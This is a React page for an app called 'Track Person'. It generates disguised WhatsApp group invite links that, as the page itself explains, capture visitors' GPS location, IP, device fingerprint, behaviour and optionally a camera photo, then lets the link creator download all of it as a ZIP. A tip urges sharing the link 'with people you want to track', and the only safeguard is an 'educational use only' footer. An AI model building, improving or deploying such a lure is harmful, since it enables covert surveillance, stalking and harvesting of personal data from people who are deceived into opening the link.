'use client';

import React, { useCallback, useEffect, useMemo, useState } from 'react';
import {
  WhatsappLogo,
  PaperPlaneTilt,
  FacebookLogo,
  Link as LinkIcon,
  ChatCircle,
  Tag,
  Clock,
  Shield,
  MapPin,
  Camera,
  Users,
  Download,
  Copy,
  QrCode,
  Lightbulb,
} from '@phosphor-icons/react';
import { exportGroupData } from '@/lib/dataExport';
import { saveGroupData } from '@/lib/storage';

const CATEGORY_OPTIONS = ['Crypto', 'Shopping', 'Trading', 'Offers', 'Travel', 'Gaming', 'Education', 'Sports', 'Community', 'Support'] as const;
const CATEGORY_IMAGES: Record<string, string> = {
  Crypto: 'https://images.unsplash.com/photo-1614288694997-7b4b6405e43c?auto=format&fit=crop&w=400&q=80',
  Shopping: 'https://images.unsplash.com/photo-1520607162513-77705c0f0d4a?auto=format&fit=crop&w=400&q=80',
  Trading: 'https://images.unsplash.com/photo-1559526324-593bc073d938?auto=format&fit=crop&w=400&q=80',
  Offers: 'https://images.unsplash.com/photo-1512436991641-6745cdb1723f?auto=format&fit=crop&w=400&q=80',
  Travel: 'https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=400&q=80',
  Gaming: 'https://images.unsplash.com/photo-1542751110-97427bbecf20?auto=format&fit=crop&w=400&q=80',
  Education: 'https://images.unsplash.com/photo-1523580846011-d3a5bc25702b?auto=format&fit=crop&w=400&q=80',
  Sports: 'https://images.unsplash.com/photo-1461896836934-ffe607ba8211?auto=format&fit=crop&w=400&q=80',
  Community: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=400&q=80',
  Support: 'https://images.unsplash.com/photo-1520607162513-77705c0f0d4a?auto=format&fit=crop&w=400&q=80',
};

const LINK_EXPIRY_MINUTES = 10;

const DATA_COLLECTION_ITEMS = [
  { icon: <MapPin size={18} weight="fill" />, title: 'Location & IP', description: 'GPS (with permission), IP geo, VPN/proxy flags, timezone, and city/region.' },
  { icon: <Shield size={18} weight="fill" />, title: 'Device fingerprint', description: 'Browser/OS, hardware hints, language, fonts, canvas/WebGL signals to spot repeats.' },
  { icon: <Users size={18} weight="fill" />, title: 'Behavior', description: 'Mouse/scroll cadence, clicks, interaction timing to detect bots or automation.' },
  { icon: <Camera size={18} weight="fill" />, title: 'Camera (optional)', description: 'If permission is granted, a single frame photo is captured for verification.' },
  { icon: <Clock size={18} weight="fill" />, title: 'Session timing', description: 'Join time, countdown status, and duplicate openings across devices.' },
  { icon: <Shield size={18} weight="fill" />, title: 'Scam indicators', description: 'Mismatch checks (IP vs GPS/timezone), VPN/proxy signals, bot heuristics.' },
] as const;

const FEATURES = [
  { icon: <WhatsappLogo size={18} weight="fill" />, label: 'WhatsApp • Live', active: true },
  { icon: <PaperPlaneTilt size={18} weight="fill" />, label: 'Telegram • Coming soon', active: false },
  { icon: <FacebookLogo size={18} weight="fill" />, label: 'Facebook Messenger • Coming soon', active: false },
] as const;

/**
 * Generate unique UUID for each group to prevent data mixing between different URLs.
 * Each generated link gets a unique groupId, ensuring data from one URL never mixes with another.
 * Uses crypto.randomUUID() for guaranteed uniqueness (RFC 4122 compliant).
 */
const generateGroupId = (): string => {
  // Use crypto.randomUUID() for guaranteed uniqueness (available in modern browsers)
  if (typeof crypto !== 'undefined' && crypto.randomUUID) {
    return crypto.randomUUID();
  }
  // Fallback: Generate a more unique ID with timestamp + random (for older browsers)
  return `${Date.now()}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
};
const calculateExpiration = () => new Date(Date.now() + LINK_EXPIRY_MINUTES * 60 * 1000);

const encodeGroupData = (data: any) => encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
const generateTrackingLink = (groupId: string, encodedInfo: string) => (typeof window === 'undefined' ? '' : `${window.location.origin}/join/${groupId}?info=${encodedInfo}`);
const formatCountdown = (diff: number) => {
  if (diff <= 0) return 'Expired';
  const minutes = Math.floor(diff / 60000);
  const seconds = Math.floor((diff % 60000) / 1000);
  return `${minutes}:${seconds.toString().padStart(2, '0')}`;
};

const copyToClipboard = async (text: string) => {
  if (!text) return;
  if (typeof navigator !== 'undefined' && navigator.clipboard?.writeText) {
    await navigator.clipboard.writeText(text);
  } else {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.style.position = 'fixed';
    textarea.style.top = '0';
    textarea.style.left = '0';
    document.body.appendChild(textarea);
    textarea.focus();
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);
  }
};

const DataCollectionGrid: React.FC = () => (
  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '16px' }}>
    {DATA_COLLECTION_ITEMS.map((item) => (
      <div
        key={item.title}
        style={{
          padding: '16px',
          borderRadius: '14px',
          backgroundColor: 'rgba(255, 255, 255, 0.06)',
          border: '1px solid rgba(255, 255, 255, 0.12)',
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '8px', color: 'white', fontWeight: 600 }}>
          {item.icon}
          <span>{item.title}</span>
        </div>
        <p style={{ fontSize: '14px', color: 'rgba(255, 255, 255, 0.82)', lineHeight: '1.5' }}>{item.description}</p>
      </div>
    ))}
  </div>
);

const FeatureBadges: React.FC = () => (
  <div style={{ marginTop: '20px', display: 'flex', flexWrap: 'wrap', justifyContent: 'center', gap: '12px' }}>
    {FEATURES.map((feature) => (
      <span
        key={feature.label}
        style={{
          padding: '8px 16px',
          borderRadius: '24px',
          fontSize: '14px',
          fontWeight: 600,
          display: 'flex',
          alignItems: 'center',
          gap: '8px',
          backgroundColor: feature.active ? 'rgba(34, 197, 94, 0.1)' : 'rgba(255, 255, 255, 0.05)',
          color: feature.active ? '#86efac' : 'rgba(255, 255, 255, 0.8)',
          border: feature.active ? '1px solid rgba(34, 197, 94, 0.2)' : '1px solid rgba(255, 255, 255, 0.1)',
        }}
      >
        {feature.icon}
        <span>{feature.label}</span>
      </span>
    ))}
  </div>
);

interface FormInputProps extends React.InputHTMLAttributes<HTMLInputElement> {
  label: string;
  icon: React.ReactNode;
}

const FormInput: React.FC<FormInputProps> = ({ label, icon, ...props }) => (
  <div>
    <label className="flex items-center gap-3 text-lg sm:text-xl font-bold text-white mb-4">
      <div className="w-12 h-12 bg-cyan-500/10 rounded-xl flex items-center justify-center ring-1 ring-cyan-300/25 text-cyan-100 text-xl">
        {icon}
      </div>
      <span>{label}</span>
    </label>
    <input
      {...props}
      className="w-full px-5 py-5 sm:py-6 border border-white/10 rounded-2xl focus:ring-4 focus:ring-cyan-400/30 focus:border-cyan-400/50 outline-none text-white bg-slate-900/60 text-lg sm:text-xl transition-all shadow-inner shadow-black/20 placeholder:text-slate-400"
    />
  </div>
);

interface FormSelectProps extends React.SelectHTMLAttributes<HTMLSelectElement> {
  label: string;
  icon: React.ReactNode;
  options: string[];
}

const FormSelect: React.FC<FormSelectProps> = ({ label, icon, options, ...props }) => (
  <div>
    <label className="flex items-center gap-3 text-lg sm:text-xl font-bold text-white mb-4">
      <div className="w-12 h-12 bg-cyan-500/10 rounded-xl flex items-center justify-center ring-1 ring-cyan-300/25 text-cyan-100 text-xl">
        {icon}
      </div>
      <span>{label}</span>
    </label>
    <select
      {...props}
      className="w-full px-5 py-5 sm:py-6 border border-white/10 rounded-2xl focus:ring-4 focus:ring-cyan-400/30 focus:border-cyan-400/50 outline-none text-white bg-slate-900/60 text-lg sm:text-xl transition-all shadow-inner shadow-black/20"
    >
      <option value="">Choose a category</option>
      {options.map((option) => (
        <option key={option} value={option}>
          {option}
        </option>
      ))}
    </select>
  </div>
);

interface ExpirationTimerProps {
  expiresAt: Date | null;
}

const ExpirationTimer: React.FC<ExpirationTimerProps> = ({ expiresAt }) => {
  const [timeRemaining, setTimeRemaining] = useState('10:00');

  useEffect(() => {
    if (!expiresAt) return;
    const update = () => {
      const diff = expiresAt.getTime() - Date.now();
      setTimeRemaining(formatCountdown(diff));
    };
    update();
    const id = setInterval(update, 1000);
    return () => clearInterval(id);
  }, [expiresAt]);

  return (
    <div className="mb-5 p-4 bg-slate-950/50 rounded-xl border border-cyan-400/20">
      <div className="flex items-center justify-between">
        <div className="flex items-center space-x-2">
          <Clock className="w-5 h-5 text-cyan-300" weight="bold" />
          <span className="text-sm font-semibold text-white">Link Expires In:</span>
        </div>
        <span className="text-2xl font-bold text-cyan-200 font-mono">{timeRemaining}</span>
      </div>
      <p className="text-xs text-cyan-200/80 mt-2 text-center">
        This link will expire in {LINK_EXPIRY_MINUTES} minutes. Downloads unlock after it ends.
      </p>
    </div>
  );
};

export default function Home() {
  const [groupName, setGroupName] = useState('');
  const [category, setCategory] = useState('');
  const [imagePreview, setImagePreview] = useState('');
  const [generatedLink, setGeneratedLink] = useState('');
  const [currentGroupId, setCurrentGroupId] = useState('');
  const [linkExpiresAt, setLinkExpiresAt] = useState<Date | null>(null);
  const [isExpired, setIsExpired] = useState(false);
  const [copied, setCopied] = useState(false);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const isFormValid = useMemo(() => groupName.trim().length > 0, [groupName]);

  const handleCategoryChange = useCallback((value: string) => {
    setCategory(value);
    setImagePreview(value ? CATEGORY_IMAGES[value] || '' : '');
  }, []);

  const handleGenerateLink = useCallback(async () => {
    setError('');
    if (!isFormValid) {
      setError('Please enter a group name');
      return;
    }
    setLoading(true);
    try {
      const groupId = generateGroupId();
      const expiresAt = calculateExpiration();
      const mappedImage = category ? CATEGORY_IMAGES[category] || '' : '';
      const groupData = {
        id: groupId,
        name: groupName,
        image: mappedImage || imagePreview || '',
        category: category || '',
        createdAt: new Date().toISOString(),
        expiresAt: expiresAt.toISOString(),
      };
      await saveGroupData(groupId, groupData);
      const encodedInfo = encodeGroupData(groupData);
      const link = generateTrackingLink(groupId, encodedInfo);
      setGeneratedLink(link);
      setCurrentGroupId(groupId);
      setLinkExpiresAt(expiresAt);
      setIsExpired(false);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to generate link');
    } finally {
      setLoading(false);
    }
  }, [isFormValid, category, imagePreview, groupName]);

  const handleCopyLink = useCallback(async () => {
    if (!generatedLink) return;
    try {
      await copyToClipboard(generatedLink);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch {
      setError('Failed to copy link');
    }
  }, [generatedLink]);

  const handleExportData = useCallback(async () => {
    if (!currentGroupId) {
      setError('Please generate a link first');
      return;
    }
    if (!isExpired) {
      setError('Download is available after the timer expires');
      return;
    }
    try {
      await exportGroupData(currentGroupId);
    } catch {
      setError('Failed to export data');
    }
  }, [currentGroupId, isExpired]);

  useEffect(() => {
    if (!linkExpiresAt) return;
    const check = () => setIsExpired(Date.now() > linkExpiresAt.getTime());
    check();
    const id = setInterval(check, 1000);
    return () => clearInterval(id);
  }, [linkExpiresAt]);

  return (
    <div className="relative min-h-screen bg-slate-950 flex items-center justify-center py-8 px-3 sm:py-12 sm:px-5 overflow-hidden">
      <div className="pointer-events-none absolute inset-0 opacity-50">
        <div className="absolute -top-28 -left-20 h-72 w-72 bg-cyan-500/10 blur-3xl" />
        <div className="absolute top-12 right-4 h-80 w-80 bg-cyan-400/8 blur-3xl" />
        <div className="absolute bottom-0 left-1/3 h-64 w-64 bg-cyan-500/8 blur-3xl" />
      </div>

      <div className="w-full max-w-5xl mx-auto space-y-7 sm:space-y-9 relative">
        <div className="text-center px-2">
          <div className="inline-flex items-center justify-center w-16 h-16 sm:w-20 sm:h-20 bg-cyan-500/10 rounded-full mb-4 sm:mb-5 backdrop-blur-sm shadow-lg ring-1 ring-cyan-400/25">
            <WhatsappLogo className="w-10 h-10 sm:w-12 sm:h-12 text-cyan-200" weight="fill" />
          </div>
          <h1 className="text-4xl sm:text-5xl lg:text-6xl font-extrabold text-white mb-2 sm:mb-3 leading-tight tracking-tight">
            Track Person
          </h1>
          <p className="text-lg sm:text-xl md:text-2xl text-cyan-100 font-medium">
            Cyber-secure invite links with deep device intelligence
          </p>
          <FeatureBadges />
        </div>

        <div className="bg-slate-900/70 border border-white/10 backdrop-blur-xl rounded-3xl shadow-2xl overflow-hidden">
          <div className="bg-linear-to-r from-cyan-600 to-cyan-700 text-white px-8 sm:px-10 py-8 sm:py-10">
            <div className="text-center">
              <div className="inline-flex items-center justify-center w-16 h-16 sm:w-20 sm:h-20 bg-white/25 rounded-2xl mb-4 sm:mb-5 backdrop-blur-md shadow-xl">
                <LinkIcon className="w-9 h-9 sm:w-11 sm:h-11 text-white" weight="bold" />
              </div>
              <h2 className="text-3xl sm:text-4xl font-bold mb-3">Create Group Link</h2>
              <p className="text-cyan-50 text-base sm:text-lg">Generate a secure tracking link for your WhatsApp group</p>
            </div>
          </div>

          <div className="p-6 sm:p-8 md:p-10">
            <div className="space-y-7 sm:space-y-9 max-w-xl mx-auto">
              <FormInput label="Group Name" icon={<ChatCircle weight="bold" />} value={groupName} onChange={(e) => setGroupName(e.target.value)} placeholder="Enter group name" />

              <div className="space-y-3">
                <FormSelect
                  label="Category (auto image)"
                  icon={<Tag weight="bold" />}
                  options={CATEGORY_OPTIONS as unknown as string[]}
                  value={category}
                  onChange={(e) => handleCategoryChange((e.target as HTMLSelectElement).value)}
                />
                {imagePreview ? (
                  <div className="mt-2 flex justify-center">
                    <img
                      src={imagePreview}
                      alt={`${category || 'Group'} cover`}
                      className="w-32 h-32 sm:w-36 sm:h-36 rounded-2xl object-cover border-4 border-cyan-500 shadow-xl"
                      onError={() => setImagePreview('')}
                    />
                  </div>
                ) : (
                  <p className="text-sm text-slate-300 text-center">A matching cover image is applied automatically based on category.</p>
                )}
              </div>

              <div className="pt-2 sm:pt-4">
                <button
                  onClick={handleGenerateLink}
                  disabled={!isFormValid || loading}
                  className="w-full bg-linear-to-r from-cyan-500 to-cyan-600 text-white py-5 sm:py-6 rounded-2xl font-bold text-xl sm:text-2xl hover:from-cyan-400 hover:to-cyan-500 active:scale-[0.98] transition-all shadow-2xl hover:shadow-3xl"
                  style={{
                    boxShadow: isFormValid && !loading ? '0 10px 30px rgba(56, 189, 248, 0.5)' : '0 4px 15px rgba(56, 189, 248, 0.2)',
                    opacity: isFormValid && !loading ? 1 : 0.5,
                    cursor: isFormValid && !loading ? 'pointer' : 'not-allowed',
                  }}
                >
                  {loading ? 'Generating...' : 'Generate Link'}
                </button>
                {!isFormValid && <p className="text-sm text-slate-300 text-center mt-3">Please enter a group name to generate the link (image optional)</p>}
              </div>

              {error && <p className="text-sm text-red-200 text-center">{error}</p>}

              {generatedLink && (
                <div className="mt-7 sm:mt-9 p-7 sm:p-8 bg-slate-900/70 backdrop-blur rounded-2xl border border-cyan-400/30 shadow-xl space-y-4">
                  <div className="flex items-center justify-center space-x-3">
                    <div className="w-10 h-10 sm:w-12 sm:h-12 bg-cyan-500/15 rounded-xl flex items-center justify-center ring-1 ring-cyan-400/30">
                      <LinkIcon className="w-6 h-6 sm:w-7 sm:h-7 text-cyan-300" weight="bold" />
                    </div>
                    <p className="text-base sm:text-lg font-bold text-white">Your Tracking Link:</p>
                  </div>

                  <div className="flex flex-col gap-3">
                    <input
                      type="text"
                      value={generatedLink}
                      readOnly
                      className="px-5 py-4 sm:py-5 bg-slate-950/50 border border-white/10 rounded-xl text-sm sm:text-base text-white focus:outline-none focus:ring-4 focus:ring-cyan-400/30 font-mono break-all text-center shadow-sm"
                    />
                    <div className="flex flex-col sm:flex-row gap-3">
                      <button
                        onClick={handleCopyLink}
                        className="flex-1 px-4 py-4 bg-linear-to-r from-cyan-500 to-cyan-600 text-white rounded-xl hover:from-cyan-400 hover:to-cyan-500 transition-all font-semibold shadow-lg flex items-center justify-center space-x-2"
                      >
                        <Copy className="w-5 h-5" weight="bold" />
                        <span>{copied ? 'Copied!' : 'Copy'}</span>
                      </button>
                      <div className="px-4 py-3 bg-slate-950/60 border border-white/10 rounded-xl flex items-center justify-center space-x-2">
                        <QrCode className="w-5 h-5 text-cyan-300" weight="bold" />
                        <span className="text-sm text-white">Scan on mobile</span>
                      </div>
                    </div>
                  </div>

                  <button
                    onClick={handleExportData}
                    disabled={!isExpired}
                    className={`w-full px-6 py-4 rounded-xl transition-all font-semibold shadow-lg flex items-center justify-center space-x-2 ${
                      isExpired ? 'bg-linear-to-r from-cyan-500 to-cyan-600 text-white hover:from-cyan-400 hover:to-cyan-500' : 'bg-slate-800 text-slate-400 cursor-not-allowed'
                    }`}
                  >
                    <Download className="w-5 h-5" weight="bold" />
                    <span>{isExpired ? 'Download All Data (ZIP)' : 'Available after timer ends'}</span>
                  </button>

                  <ExpirationTimer expiresAt={linkExpiresAt} />

                  <div className="p-5 bg-slate-950/50 rounded-xl border border-cyan-400/20 space-y-2 text-center">
                    <p className="text-sm sm:text-base text-slate-200 leading-relaxed flex items-center justify-center gap-2">
                      <Lightbulb className="w-4 h-4 text-cyan-300" weight="fill" />
                      <span>Tip: Share this link with people you want to track. QR works great for mobile joins.</span>
                    </p>
                    <p className="text-sm sm:text-base text-slate-200 leading-relaxed font-semibold">
                      Downloads unlock after the {LINK_EXPIRY_MINUTES}-minute timer ends; users can still join during the timer.
                    </p>
                    <p className="text-sm sm:text-base text-slate-200 leading-relaxed">
                      Location, device info, VPN check, and behavioral signals are collected to help block scammers.
                    </p>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>

        <div className="bg-white/10 backdrop-blur-md rounded-3xl p-6 sm:p-7 text-white border border-white/20 shadow-xl">
          <div className="flex items-center justify-between flex-wrap gap-3 mb-4">
            <h3 className="text-xl sm:text-2xl font-bold">What data will be captured?</h3>
            <span className="text-sm px-3 py-1 rounded-full bg-white/15 text-white/90">Visible to you only</span>
          </div>
          <DataCollectionGrid />
        </div>

        <div className="text-center text-white/80 text-sm space-y-1">
          <p>This is for educational use only.</p>
          <p className="flex items-center justify-center gap-2">
            <PaperPlaneTilt className="w-4 h-4" weight="fill" />
            <span>Developer: @I_am_codeing</span>
          </p>
        </div>
      </div>
    </div>
  );
}
 